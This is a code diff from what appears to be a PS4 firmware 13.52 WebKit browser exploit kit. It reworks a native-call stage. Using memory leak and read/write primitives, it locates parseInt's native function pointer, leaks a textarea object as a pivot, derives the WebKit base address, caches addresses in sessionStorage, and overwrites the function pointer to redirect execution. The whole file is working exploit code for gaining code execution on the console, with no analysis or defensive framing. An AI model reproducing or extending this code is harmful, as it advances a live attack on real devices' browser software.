@@ -1,8 +1,7 @@
 /**
- * PS4 13.52 native call — built from slopkit-core anchors (parseInt + carrier textarea).
- * NOT chain_poops / expm1 / PS5 Collator — uses addresses validated @ PRIMITIVE-OK.
+ * PS4 13.52 native call — parseInt + carrier textarea (slopkit-core anchors).
+ * Live re-scan fallback — does not rely on core.js module singleton (cache-safe).
  */
-import { getCoreNative } from "./core.js";
 import { int64 } from "./int64.js";
 import {
     prepNativeChain, layoutSmokeStack, fireNativeCall, firePivotSmoke,
@@ -11,45 +10,155 @@ import {
 } from "./native_call.js";
 
 const M_FUNCTION_OFF = 0x28;
+const JSFUNC_EXECUTABLE_OFF = 0x18;
+const CORE_NATIVE_SS = "wk-core-native";
 
 function numToI64(n) {
+    if (n == null) return null;
+    if (typeof n === "object" && n != null && "low" in n)
+        return new int64(n.low >>> 0, (n.hi >>> 0));
+    if (typeof n === "string") {
+        const s = n.replace(/^0x/i, "").trim();
+        if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
+        if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
+        if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
+        return new int64(
+            parseInt(s.slice(-8), 16) >>> 0,
+            parseInt(s.slice(0, -8), 16) >>> 0);
+    }
     if (!Number.isFinite(n) || n <= 0) return null;
-    const lo = (n >>> 0);
-    const hi = Math.floor(n / 0x100000000) >>> 0;
-    return new int64(lo, hi);
+    return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
 }
 
-/**
- * Capture mainMf from carrier.native — zero rescan, matches core validation path.
- * @returns {object|null} cap for prepNativeChain
- */
+function loadStoredNative() {
+    try {
+        const raw = sessionStorage.getItem(CORE_NATIVE_SS);
+        if (!raw) return null;
+        const j = JSON.parse(raw);
+        if (!j) return null;
+        const exec = numToI64(j.executable);
+        const targetCell = numToI64(j.targetCell);
+        if (!exec || !targetCell) return null;
+        return {
+            target: parseInt,
+            targetCell: j.targetCell,
+            executable: j.executable,
+            nativeFn: j.nativeFn,
+            textareaCell: j.textareaCell,
+            holderCell: j.holderCell,
+            _src: "sessionStorage",
+        };
+    } catch (_) {
+        return null;
+    }
+}
+
+function nativeFromCarrier(carrier) {
+    if (!carrier) return null;
+    if (carrier.native) {
+        const exec = numToI64(carrier.native.executable);
+        const tc = numToI64(carrier.native.targetCell);
+        if (exec && tc)
+            return Object.assign({ _src: "carrier.native" }, carrier.native);
+    }
+    if (Number.isFinite(carrier.textareaAddress) && carrier.textareaAddress > 0) {
+        return {
+            target: parseInt,
+            textareaCell: carrier.textareaAddress,
+            _src: "carrier.textareaAddress",
+        };
+    }
+    return loadStoredNative();
+}
+
+/** Walk parseInt JSFunction → NativeExecutable+0x28 @ PRIMITIVE-OK (same as core validation). */
+export function captureParseIntLive(p, carrier) {
+    if (!p || typeof p.leakval !== "function")
+        return { err: "no-p" };
+    const textarea = carrier && carrier.textarea;
+    if (!textarea)
+        return { err: "no-textarea-on-carrier" };
+
+    let targetCell;
+    try { targetCell = p.leakval(parseInt); } catch (e) {
+        return { err: "leakval(parseInt): " + (e && e.message ? e.message : e) };
+    }
+    if (!targetCell || targetCell.hi < 0x80)
+        return { err: "bad-parseInt-cell=" + targetCell };
+
+    let exec;
+    try { exec = p.read8(targetCell.add32(JSFUNC_EXECUTABLE_OFF)); } catch (e) {
+        return { err: "read exec@+0x18: " + (e && e.message ? e.message : e) };
+    }
+    if (!exec || exec.hi < 0x80)
+        return { err: "bad-exec-ptr=" + exec };
+
+    const mainMf = exec.add32(M_FUNCTION_OFF);
+    let mainOrig;
+    try { mainOrig = p.read8(mainMf); } catch (e) {
+        return { err: "read m_function: " + (e && e.message ? e.message : e) };
+    }
+    if (!mainOrig || mainOrig.hi < 0x80)
+        return { err: "bad-native-fn=" + mainOrig + "@+" + M_FUNCTION_OFF.toString(16) };
+
+    let pivotCell;
+    try { pivotCell = p.leakval(textarea); } catch (e) {
+        const ta = numToI64(carrier.textareaAddress);
+        if (!ta) return { err: "leakval(textarea) failed" };
+        pivotCell = ta;
+    }
+
+    return {
+        cap: {
+            mainMf,
+            mainOrig,
+            nativeFn: mainOrig,
+            pivotTrigger: parseInt,
+            pivotBuiltinName: "parseint-live",
+            path: "live-parseInt-scan",
+            cell: targetCell,
+            pivotObj: textarea,
+            pivotCell,
+            textarea,
+        },
+    };
+}
+
 export function captureFromCarrier(p, carrier, off) {
-    const nat = getCoreNative(carrier);
+    const live = captureParseIntLive(p, carrier);
+    if (live.cap) return live.cap;
+
+    const nat = nativeFromCarrier(carrier);
     if (!nat) return null;
+
     const exec = numToI64(nat.executable);
     const targetCell = numToI64(nat.targetCell);
-    if (!exec || !targetCell) return null;
+    if (!exec || !targetCell) {
+        return null;
+    }
 
     const mainMf = exec.add32(M_FUNCTION_OFF);
     let mainOrig;
     try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
     if (!mainOrig || mainOrig.hi < 0x80) return null;
 
-    const parseRva = (off && off.wk_parseint_native) || 0x1ea18;
-    const webkitHint = mainOrig.sub32(parseRva);
+    let pivotObj = carrier && carrier.textarea || null;
+    let pivotCell = numToI64(nat.textareaCell);
+    if (pivotObj) {
+        try { pivotCell = p.leakval(pivotObj); } catch (_) { }
+    }
 
     return {
         mainMf,
         mainOrig,
         nativeFn: mainOrig,
-        webkitHint,
         pivotTrigger: nat.target || parseInt,
-        pivotBuiltinName: "parseint-core",
-        path: "core-carrier@PRIMITIVE-OK",
+        pivotBuiltinName: "parseint-stored",
+        path: "stored-" + (nat._src || "?"),
         cell: targetCell,
-        pivotObj: carrier.textarea || null,
-        pivotCell: numToI64(nat.textareaCell),
-        textarea: carrier.textarea || null,
+        pivotObj,
+        pivotCell,
+        textarea: pivotObj,
     };
 }
 
@@ -63,15 +172,23 @@ export function webkitBaseFromCap(cap, off) {
     return base;
 }
 
-/** Prep slab using core anchors — pivotObj = carrier textarea by default. */
 export function prepCoreNative(p, off, carrier, opts) {
     opts = opts || {};
     const cap = captureFromCarrier(p, carrier, off);
-    if (!cap) throw new Error("core_native: parseInt anchors missing — hard-reload (core.js cache?) then Start");
-    if (!cap.pivotObj) throw new Error("core_native: carrier textarea missing");
+    if (!cap) {
+        const live = captureParseIntLive(p, carrier);
+        throw new Error("core_native: " + (live.err || "parseInt anchors missing"));
+    }
+    return finishCorePrep(p, off, carrier, cap);
+}
 
+function finishCorePrep(p, off, carrier, cap) {
+    if (!cap.pivotObj)
+        throw new Error("core_native: carrier textarea missing");
     const webkitBase = webkitBaseFromCap(cap, off);
-    if (!webkitBase) throw new Error("core_native: webkit base from parseInt failed");
+    if (!webkitBase)
+        throw new Error("core_native: webkit base bad (parseInt rva "
+            + (off.wk_parseint_native || 0).toString(16) + ") fn=" + cap.nativeFn);
 
     cap.pivotTrigger = cap.pivotTrigger || parseInt;
     const prep = prepNativeChain(p, off, webkitBase, cap);
@@ -116,7 +233,6 @@ export function fireCoreNotify(p, prep, lk, off, hookMode, message) {
     return fireNativeCall(p, prep, off, opts);
 }
 
-/** Bisect: parseInt(1) with G0 armed — no hook. */
 export function bisectCoreTriggerLite(p, prep) {
     if (!prep.mainArmed && prep.mainMf && prep.G) {
         p.write8(prep.mainMf, prep.G.G0);
